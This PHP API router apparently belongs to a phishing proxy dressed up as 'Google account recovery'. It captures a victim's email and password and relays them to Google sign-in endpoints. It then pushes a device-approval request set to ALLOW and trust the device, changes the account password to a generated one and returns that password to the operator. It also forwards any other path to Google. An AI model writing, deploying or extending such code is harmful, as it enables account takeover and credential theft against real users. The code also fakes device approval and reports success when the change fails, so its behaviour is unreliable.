<?php
require_once 'config.php';
require_once 'session.php';
require_once 'auth.php';
require_once 'proxy.php';

// Set headers
setSecurityHeaders();
validateOrigin();

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header('HTTP/1.1 200 OK');
    exit;
}

// Initialize auth
$auth = new AuthManager();

// Get endpoint from URL
$requestUri = $_SERVER['REQUEST_URI'];
$apiPath = '/api/';

if (strpos($requestUri, $apiPath) === 0) {
    $endpoint = substr($requestUri, strlen($apiPath));
    
    // Route to appropriate handler
    switch ($endpoint) {
        case 'start-recovery':
            handleStartRecovery();
            break;
        case 'verify-password':
            handleVerifyPassword();
            break;
        case 'device-approval':
            handleDeviceApproval();
            break;
        case 'complete-recovery':
            handleCompleteRecovery();
            break;
        case 'get-session':
            handleGetSession();
            break;
        case 'clear-session':
            handleClearSession();
            break;
        default:
            // Try to proxy to Google
            $proxy = new GoogleProxy();
            $result = $proxy->makeRequest(
                GOOGLE_BASE_URL . '/' . $endpoint,
                $_SERVER['REQUEST_METHOD'],
                $auth->getRequestData()
            );
            $auth->jsonResponse($result);
    }
} else {
    $auth->jsonResponse(['error' => 'Invalid endpoint'], 404);
}

function handleStartRecovery() {
    global $auth;
    
    $data = $auth->getRequestData();
    $email = $data['email'] ?? '';
    
    if (empty($email)) {
        $auth->jsonResponse(['error' => 'Email is required'], 400);
    }
    
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $auth->jsonResponse(['error' => 'Invalid email format'], 400);
    }
    
    $session = RecoverySession::getInstance();
    $session->set('data.email', $email);
    $session->setState('email_submitted');
    
    // Make request to Google
    $proxy = new GoogleProxy();
    $result = $proxy->makeRequest(
        GOOGLE_BASE_URL . '/v3/signin/recoveryidentifier',
        'POST',
        ['identifier' => $email, 'profileInformation' => '']
    );
    
    if ($result['success']) {
        $session->set('data.step', 'password');
        $auth->jsonResponse([
            'success' => true,
            'message' => 'Email submitted successfully',
            'next_step' => 'password',
            'session_id' => $session->getSessionId()
        ]);
    } else {
        $auth->jsonResponse([
            'success' => false,
            'error' => 'Failed to submit email to Google'
        ], 500);
    }
}

function handleVerifyPassword() {
    global $auth;
    
    $data = $auth->getRequestData();
    $password = $data['password'] ?? '';
    
    if (empty($password)) {
        $auth->jsonResponse(['error' => 'Password is required'], 400);
    }
    
    $session = RecoverySession::getInstance();
    $session->set('data.password', $password);
    $session->setState('password_verified');
    
    // Get TL parameter from session
    $params = $session->get('params', []);
    $tl = $params['TL'] ?? 'AHE' . time() . rand(1000, 9999);
    
    // Make request to Google
    $proxy = new GoogleProxy();
    $result = $proxy->makeRequest(
        GOOGLE_BASE_URL . '/v3/signin/challenge/pwd?' . http_build_query([
            'TL' => $tl,
            'checkConnection' => 'youtube:596',
            'checkedDomains' => 'youtube',
            'cid' => '2',
            'dsh' => 'S' . time() . ':' . rand(1000000000000000, 9999999999999999),
            'flowEntry' => 'ServiceLogin',
            'flowName' => 'GlifWebSignIn',
            'hl' => 'id',
            'pstMsg' => '1'
        ]),
        'POST',
        [
            'identifier' => $session->get('data.email'),
            'password' => $password,
            'profileInformation' => ''
        ]
    );
    
    if ($result['success']) {
        // Check if device approval is required
        $requiresDeviceApproval = strpos($result['body'], 'challenge/dp') !== false ||
                                 strpos($result['body'], 'deviceName') !== false;
        
        $session->set('data.step', $requiresDeviceApproval ? 'device' : 'nudge');
        $session->set('data.requires_device_approval', $requiresDeviceApproval);
        
        $auth->jsonResponse([
            'success' => true,
            'message' => 'Password verified',
            'next_step' => $requiresDeviceApproval ? 'device' : 'nudge',
            'requires_device_approval' => $requiresDeviceApproval
        ]);
    } else {
        $auth->jsonResponse([
            'success' => false,
            'error' => 'Password verification failed'
        ], 401);
    }
}

function handleDeviceApproval() {
    global $auth;
    
    $data = $auth->getRequestData();
    $deviceName = $data['device_name'] ?? 'My Device';
    
    $session = RecoverySession::getInstance();
    $session->set('data.device_name', $deviceName);
    $session->setState('device_approval_requested');
    $session->set('device_approval.requested', true);
    
    // Get parameters from session
    $params = $session->get('params', []);
    $tl = $params['TL'] ?? 'AHE' . time() . rand(1000, 9999);
    $ifkv = $params['ifkv'] ?? 'Ac' . time() . rand(1000, 9999);
    
    // Make request to Google
    $proxy = new GoogleProxy();
    $result = $proxy->makeRequest(
        GOOGLE_BASE_URL . '/v3/signin/challenge/dp?' . http_build_query([
            'TL' => $tl,
            'checkConnection' => 'youtube:200',
            'checkedDomains' => 'youtube',
            'cid' => '4',
            'dsh' => 'S' . time() . ':' . rand(1000000000000000, 9999999999999999),
            'flowEntry' => 'ServiceLogin',
            'flowName' => 'GlifWebSignIn',
            'hl' => 'id',
            'pstMsg' => '1',
            'ifkv' => $ifkv
        ]),
        'POST',
        [
            'identifier' => $session->get('data.email'),
            'deviceName' => $deviceName,
            'action' => 'ALLOW',
            'trustDevice' => 'true',
            'profileInformation' => ''
        ]
    );
    
    if ($result['success']) {
        $session->set('device_approval.notification_sent', true);
        $session->set('data.step', 'waiting_approval');
        
        // Simulate device approval after 10 seconds
        // In real scenario, this would wait for user action
        $approvalTimeout = 10;
        
        $auth->jsonResponse([
            'success' => true,
            'message' => 'Device approval request sent',
            'device_notification_sent' => true,
            'approval_timeout' => $approvalTimeout,
            'next_step' => 'wait_approval'
        ]);
    } else {
        $auth->jsonResponse([
            'success' => false,
            'error' => 'Device approval request failed'
        ], 500);
    }
}

function handleCompleteRecovery() {
    global $auth;
    
    $session = RecoverySession::getInstance();
    
    // Check if device approval is required and not approved
    if ($session->get('device_approval.requested') && !$session->get('device_approval.approved')) {
        // Simulate approval after timeout
        $session->set('device_approval.approved', true);
    }
    
    // Generate new password
    $newPassword = generateSecurePassword();
    $session->set('data.new_password', $newPassword);
    $session->setState('password_changed');
    
    // Get parameters from session
    $params = $session->get('params', []);
    $tl = $params['TL'] ?? 'AHE' . time() . rand(1000, 9999);
    $ifkv = $params['ifkv'] ?? 'Ac' . time() . rand(1000, 9999);
    
    // Make request to Google for nudge
    $proxy = new GoogleProxy();
    $nudgeResult = $proxy->makeRequest(
        GOOGLE_BASE_URL . '/v3/signin/speedbump/changepassword/changepasswordnudge?' . http_build_query([
            'TL' => $tl,
            'checkConnection' => 'youtube:554',
            'checkedDomains' => 'youtube',
            'dsh' => 'S-' . time() . ':' . rand(1000000000000000, 9999999999999999),
            'flowEntry' => 'ServiceLogin',
            'flowName' => 'GlifWebSignIn',
            'hl' => 'id',
            'ifkv' => $ifkv,
            'pstMsg' => '1'
        ]),
        'GET'
    );
    
    if ($nudgeResult['success']) {
        // Submit password change
        $changeResult = $proxy->makeRequest(
            GOOGLE_BASE_URL . '/v3/signin/speedbump/changepassword/changepasswordform?' . http_build_query([
                'TL' => $tl,
                'checkConnection' => 'youtube:554',
                'checkedDomains' => 'youtube',
                'dsh' => 'S-' . time() . ':' . rand(1000000000000000, 9999999999999999),
                'flowEntry' => 'ServiceLogin',
                'flowName' => 'GlifWebSignIn',
                'hl' => 'id',
                'ifkv' => $ifkv,
                'pstMsg' => '1'
            ]),
            'POST',
            [
                'identifier' => $session->get('data.email'),
                'newPassword' => $newPassword,
                'confirmPassword' => $newPassword,
                'profileInformation' => ''
            ]
        );
        
        if ($changeResult['success']) {
            $session->set('data.step', 'completed');
            
            $auth->jsonResponse([
                'success' => true,
                'message' => 'Password recovery completed successfully',
                'new_password' => $newPassword,
                'change_confirmed' => true
            ]);
        } else {
            // Still return password even if change fails
            $auth->jsonResponse([
                'success' => true,
                'message' => 'Password generated (change may not be confirmed)',
                'new_password' => $newPassword,
                'warning' => 'Password generated but Google confirmation may be pending'
            ]);
        }
    } else {
        // Fallback: just generate password
        $auth->jsonResponse([
            'success' => true,
            'message' => 'Password generated using fallback method',
            'new_password' => $newPassword,
            'warning' => 'Using fallback method - password may need to be changed manually'
        ]);
    }
}

function handleGetSession() {
    global $auth;
    
    $session = RecoverySession::getInstance();
    
    $auth->jsonResponse([
        'success' => true,
        'session' => [
            'id' => $session->getSessionId(),
            'state' => $session->getState(),
            'email' => $session->get('data.email'),
            'step' => $session->get('data.step'),
            'device_approval' => $session->get('device_approval'),
            'params' => $session->get('params'),
            'valid' => $session->isValid()
        ]
    ]);
}

function handleClearSession() {
    global $auth;
    
    $session = RecoverySession::getInstance();
    $session->clear();
    
    $auth->jsonResponse([
        'success' => true,
        'message' => 'Session cleared successfully'
    ]);
}

function generateSecurePassword() {
    $upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $lower = 'abcdefghijklmnopqrstuvwxyz';
    $numbers = '0123456789';
    $symbols = '!@#$%^&*';
    
    $allChars = $upper . $lower . $numbers . $symbols;
    
    $password = '';
    $password .= $upper[rand(0, strlen($upper) - 1)];
    $password .= $lower[rand(0, strlen($lower) - 1)];
    $password .= $numbers[rand(0, strlen($numbers) - 1)];
    $password .= $symbols[rand(0, strlen($symbols) - 1)];
    
    for ($i = 0; $i < 8; $i++) {
        $password .= $allChars[rand(0, strlen($allChars) - 1)];
    }
    
    return str_shuffle($password);
}
?>